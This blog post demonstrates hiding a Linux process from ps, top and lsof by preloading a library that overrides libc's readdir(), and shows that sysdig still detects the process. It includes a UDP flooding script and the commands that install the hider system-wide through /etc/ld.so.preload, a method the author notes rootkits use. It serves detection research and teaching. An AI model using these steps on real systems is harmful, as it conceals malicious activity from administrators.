Hiding Linux Processes For Fun And Profit
-----------------------------------------

Introduction
------------

The other day I was looking at the output of `top` on my machine, and I
wondered: how hard would it be to hide specific processes and/or network
connections from traditional monitoring tools like `ps`, `top`, `lsof`,
…? I decided to kill a couple hours and try to hack together a solution.
In this post, I’ll show you some of the answers I came up with, and some
proof of concept code to implement this. I’ll also show that sysdig is
not susceptible to my hack, and explain why.

The goal that I want to achieve is to deliberately hide a simple and
malicious Python script (I’ll call it `evil_script.py`) that does some
damage to my system, saturating CPU and network by sending UDP packets
towards a poor victim:

    #!/usr/bin/python
    import socket
    import sys
     
    def send_traffic(ip, port):
         print "Sending burst to " + ip + ":" + str(port)
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.connect((ip, port))
         while True:
             sock.send("I AM A BAD BOY") 
     
    if len(sys.argv) != 3:
         print "Usage: " + sys.argv[0] + " IP PORT"
         sys.exit() 
     
    send_traffic(sys.argv[1], int(sys.argv[2]))

Let’s go!

The Baseline Behavior
---------------------

I’ll start by running this:

    gianluca@sid:~$ ./evil_script.py 1.2.3.4 666
    Sending burst to 1.2.3.4:666

If you run it, you’ll see it will quickly saturate your system
resources. Perfect use case for starting the analysis. Let’s confirm
that the process is there and eating my CPU, using `ps`:

    gianluca@sid:~$ ps aux
    USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    ...
    gianluca  8585  105  0.0  34256  6152 pts/6    R+   12:03   0:07 /usr/bin/python ./evil_script.py 1.2.3.4 666
    ...

Yep. I can also look at the network connections opened by the process by
using `lsof`:

    gianluca@sid:~$ sudo lsof -i
    COMMAND    PID        USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
    ...
    evil_scri 8290    gianluca    3u  IPv4  23936      0t0  UDP 172.16.189.136:33220->1.2.3.4:666
    ...

So the process is there, doing network activity. If I want to hide this
information, the first thing I have to do is understand how `ps` and
similar tools can actually extract the information about my process.

How ps works
------------

Tools like `ps` leverage the `/proc` file system, a Linux construct that
we explained at a high level in a [previous
post](http://draios.com/ps-lsof-netstat-time-travel/). Let’s dig into
the details now using `sysdig`:

    gianluca@sid:~$ sudo sysdig proc.name = ps
    ...
    447463 23:54:12.077878685 2 ps (3214) > openat dirfd=AT_FDCWD name=/proc flags=1089(O_DIRECTORY|O_NONBLOCK|O_RDONLY) mode=0 
    447465 23:54:12.077880122 2 ps (3214) < openat fd=5(/proc) 
    447473 23:54:12.077887674 2 ps (3214) > getdents 
    447486 23:54:12.077988237 2 ps (3214) < getdents  ... 452546 23:54:12.082257864 2 ps (3214) > open 
    452547 23:54:12.082259424 2 ps (3214) < open fd=6(/proc/3174/stat) name=/proc/3174/stat flags=1(O_RDONLY) mode=0

    452549 23:54:12.082262601 2 ps (3214) < read res=322 data=3174 (evil_script.py) R 3089 3174 3089 34816 3174 4202496 1620 0 15 0 8 3474 0 0  452550 23:54:12.082262874 2 ps (3214) > close fd=6(/proc/3174/stat)

    452554 23:54:12.082268000 2 ps (3214) > read fd=6(/proc/3174/status) size=1024 
    452555 23:54:12.082274407 2 ps (3214) < read res=854 data=Name:.evil_script.py.State:.R (running).Tgid:.3174.Ngid:.0.Pid:.3174.PPid:.3089.  452556 23:54:12.082274624 2 ps (3214) > close fd=6(/proc/3174/status) 
    452557 23:54:12.082274724 2 ps (3214) < close res=0  452558 23:54:12.082276935 2 ps (3214) > open 
    452559 23:54:12.082278171 2 ps (3214) < open fd=6(/proc/3174/cmdline) name=/proc/3174/cmdline flags=1(O_RDONLY) mode=0 
    452560 23:54:12.082278466 2 ps (3214) > read fd=6(/proc/3174/cmdline) size=131072 
    452561 23:54:12.082280215 2 ps (3214) < read res=46 data=/usr/bin/python../evil_script.py.1.2.3.4.6666.  452562 23:54:12.082280463 2 ps (3214) > read fd=6(/proc/3174/cmdline) size=131026 
    452563 23:54:12.082280814 2 ps (3214) < read res=0 data=  452564 23:54:12.082281083 2 ps (3214) > close fd=6(/proc/3174/cmdline) 
    452565 23:54:12.082281216 2 ps (3214) < close res=0

This perfectly highlights how `ps` works: first, the directory `/proc`
is opened via the `openat()` system call. Then, the process calls
`getdents()` on the opened directory, which is a system call that
returns the list of files/directories contained in a specific directory
(`/proc` in this case). If you’ve ever run `ls /proc`, you noticed that
there is a subdirectory for every running process in the system, and
each directory is named after the PID of the process itself. So, `ps`
will just grab the list from `getdents()`, and then iterate over a fixed
set of files in each subdirectory. These files, as you can see from the
event list, are named `/proc/PID/status`, `/proc/PID/stat`, and
`/proc/PID/cmdline`, and contain all the information that ps shows in
the output.

It’s worth noticing (as it will be useful in the next section), that the
process itself doesn’t directly call `openat()` and `getdents()`, as
those are system calls that are abstracted by the C standard library
(`libc`). If you ever cared to read the `libc` documentation, `libc`
provides two different functions, `opendir()` and `readdir()`, and they
take care of calling the system calls themselves, providing a somewhat
simpler API to the developer. So these last ones are the functions that
are directly called from `ps`.

Hiding the process
------------------

After this quick digression on how `ps` works, it seems fairly obvious
that if we want to hide our process, we need a way to prevent these
tools from accessing the proper files under `/proc/PID/`. What are the
options? There are various methods worth mentioning:

-   **Using a proper framework**: there are a bunch of very good
    frameworks, like SELinux and Grsecurity that do, among other things,
    exactly this. In a production system, I would absolutely consider
    these, although today I want to get my hands dirty and have fun
    creating something from scratch.
-   **Modify top/ps/… binaries**: I could grab the source code of each
    of these tools, implement my own “hiding” logic, recompile, and
    replace the binaries. Very inefficient and time consuming.
-   **Modify `libc`**: I could modify the `readdir()` function inside
    `libc` and input the code to exclude the access to some `/proc`
    files. But recompiling `libc` is a burden, not to mention the `libc`
    code tends to be very hard to understand.
-   **Modify the system calls in the kernel**: This is the most
    advanced, and it would work by intercepting and modifying the
    `getdents()` system call directly in the kernel with a custom
    module. It’s definitely tempting, but I won’t follow this route
    today because I’m already very familiar with how the system call
    interception works in sysdig, so I want to do something new.

I decided to go for an intermediate solution, one that is interesting
and simple enough to implement in an hour or so: it’s a variant of
“modifying `libc`” based on a tricky feature offered by the Linux
dynamic linker (the component that takes care of loading the various
libraries needed by a program at runtime), called *preloading*.

With preloading, Linux is kind enough to give us the option to load a
custom shared library before the other normal system libraries are
loaded. This means that, if the custom library exports a function with
the same signature of one found in a system library, we are literally
able to override it with the custom code in our library, and all the
processes will automatically pick our custom one!

This sounds like a solution to my problem, because I could write a very
simple custom library that overrides `libc`’s `readdir()`, and write the
logic to hide the process! The logic would be fairly straightforward
too: every time I see that the `/proc/PID` directory (where PID is the
PID of the process having the name “evil\_script”) is being read, I just
block that access in a clean way, thus hiding the entire directory! I
went ahead and implemented these thoughts in code. You can get the
sources at
[https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c](https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2Fgianlucaborello%2Flibprocesshider%2Fblob%2Fmaster%2Fprocesshider.c&sa=D&sntz=1&usg=AFQjCNG9NAzL2vg0amVh-qnWmy4XJnyd1w)
(it’s actually less than 100 lines of code including comments, so go
read it!). Once the code is written, let’s compile it as a shared
library, and install it in the system path:

    gianluca@sid:~/libprocesshider$ make
    gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
    gianluca@sid:~/libprocesshider$ sudo mv libprocesshider.so /usr/local/lib/

Now, I just need to tell the dynamic linker to actually use it. I want
to install it system-wide, so that every new process in the system can
pick this up automatically. This is done by simply writing my library
path into a configuration file:

    root@sid:~# echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

Done! From this moment on, every new binary that I’ll launch will
execute my custom code when iterating through directories via
`readdir()`. So let’s go back and try this executing `ps` and `lsof`
while the evil script is running:

    gianluca@sid:~$ sudo ps aux
    USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
    ...

    gianluca@sid:~$ sudo lsof -ni
    COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
    ...

It works! My process is now running in invisible mode, even when the
tools are run as root. I also repeated this with `pstree`, `top` and
`htop`, and none of them were able to show my process anymore.

This is just a simple example, but we could also spoof more information,
for example:

-   Modify the global CPU usage counters: `/proc/stat` contains those
    statistics, so I could intercept all the read operations to that
    file and return a custom one, faking a 0% global CPU usage.
-   Modify the connection list: for example, netstat uses the
    `/proc/net/tcp` file to get the list of TCP connections. Just
    intercept the reads to the file and hide a specific connection.

Good exercises for the reader
![:)](http://draios.com/wp-includes/images/smilies/icon_smile.gif)

Note that this method won’t work if the binaries are statically linked
against `libc`. I’ve seen some niche distributions extremely focused on
security, where all the binaries dependencies are statically linked.
This has the huge disadvantage that the binaries tend to get pretty big,
and shipping an update for a library forces shipping new binaries of
every program that depends on it, so usually it’s not done for
mainstream distributions.

Sysdig
------

Let’s see if sysdig can be tricked as well, starting by CPU usage:

    gianluca@sid:~$ sudo sysdig -c topprocs_cpu
    CPU% Process
    ------------------------------
    99.99% evil_script.py
    2.46% sysdig
    0.27% java
    0.03% sshd

And network activity:

    gianluca@sid:~$ sudo sysdig -c topprocs_net
    Bytes Process
    ------------------------------
    862.53KB evil_script.py
    400B sshd

    gianluca@sid:~$ sudo sysdig -c topconns
    Bytes Proto Connection
    ------------------------------
    841.79KB udp 172.16.189.136:54241->1.2.3.4:8888
    496B tcp 172.16.189.1:57832->172.16.189.136:22

With sysdig, we’re still able to see it all! This is because sysdig
doesn’t necessarily rely on `/proc` to look for system activity
(although it uses it if available). Sysdig inspects every system call,
and in this data the malicious process is still clearly visible, along
with all its used resources. Hiding system calls is a much more
challenging task that can’t be done in a couple hours. In fact, sysdig
can see **everything**:

    gianluca@sid:~$ sudo sysdig proc.name contains evil_script
    261683 19:27:57.433924531 0 evil_script.py (43534) > sendto fd=3(172.16.189.136:54241->1.2.3.4:8888) size=14 tuple=NULL
    261684 19:27:57.433930125 0 evil_script.py (43534) < sendto res=14 data=I AM A BAD BOY 261685 19:27:57.433931321 0 evil_script.py (43534) > sendto fd=3(172.16.189.136:54241->1.2.3.4:8888) size=14 tuple=NULL

    261688 19:27:57.433980600 0 evil_script.py (43534) < sendto res=14 data=I AM A BAD BOY 261689 19:27:57.433981682 0 evil_script.py (43534) > sendto fd=3(172.16.189.136:54241->1.2.3.4:8888) size=14 tuple=NULL
    261690 19:27:57.434022148 0 evil_script.py (43534) < sendto res=14 data=I AM A BAD BOY 261691 19:27:57.434026297 0 evil_script.py (43534) > sendto fd=3(172.16.189.136:54241->1.2.3.4:8888) size=14 tuple=NULL
    ...

As a bonus, sysdig is also showing me that the dynamic linker is loading
my custom library before `libc`. This is what happens when `ps` executes
after the preload change:

    gianluca@sid:~$ sudo sysdig proc.name = ps
    2731 00:21:52.721054253 1 ps (3351) < execve res=0 exe=ps args=aux. tid=3351(ps) pid=3351(ps) ptid=3111(bash) cwd=/home/gianluca fdlimit=1024 pgft_maj=0 pgft_min=62 vm_size=512 vm_rss=4 vm_swap=0
    ...
    2739 00:21:52.721129329 1 ps (3351) < open fd=3(/usr/local/lib/libprocesshider.so) name=/usr/local/lib/libprocesshider.so flags=1(O_RDONLY) mode=0
    2740 00:21:52.721130670 1 ps (3351) > read fd=3(/usr/local/lib/libprocesshider.so) size=832
    ...
    2810 00:21:52.721293540 1 ps (3351) > open
    2811 00:21:52.721296677 1 ps (3351) < open fd=3(/lib/x86_64-linux-gnu/libc.so.6) name=/lib/x86_64-linux-gnu/libc.so.6 flags=1(O_RDONLY) mode=0
    2812 00:21:52.721297343 1 ps (3351) > read fd=3(/lib/x86_64-linux-gnu/libc.so.6) size=832
    ...

`/usr/local/lib/libprocesshider.so` is automatically loaded (with
`open()` and `read()`) before `/lib/x86_64-linux-gnu/libc.so.6`, without
having to change the `ps` code or the `libc` code.

In theory, I could have used `strace/ltrace` to attach to the process
and see what it was doing in a similar way, but if you remember I
completely hid the malicious process PID from `/proc`, so how would we
find it? Those tools require the exact PID to attach in order to work. I
could have brute-forced the entire PID range, but that doesn’t seem like
a very attractive alternative. Also, those tools just provide a flat
list of events, whereas sysdig, with chisels, can aggregate the events
and show me exactly what I care about (in this case CPU/network
consumption).

Final notes
-----------

As one last consideration, it’s worth clarifying that although it might
be possible to get your machine compromised in this exact way (I know
there are rootkits out there who rely on this easy and effective
method), that is certainly not the point of this post. I just enjoyed it
as a thought experiment, and hopefully this demonstrates a simple and
powerful method that can be used by application developers to solve real
problems in certain circumstances. I think this also proves that
monitoring the system usage can be done from different perspectives, and
getting data from system calls can be as good as extracting it from the
`/proc` file system. And at the end of the day, I think we’re all very
lucky to have Linux and the `/proc` file system with its useful metrics
exported in plain-text files, ready to be read and inspected without any
custom tools!
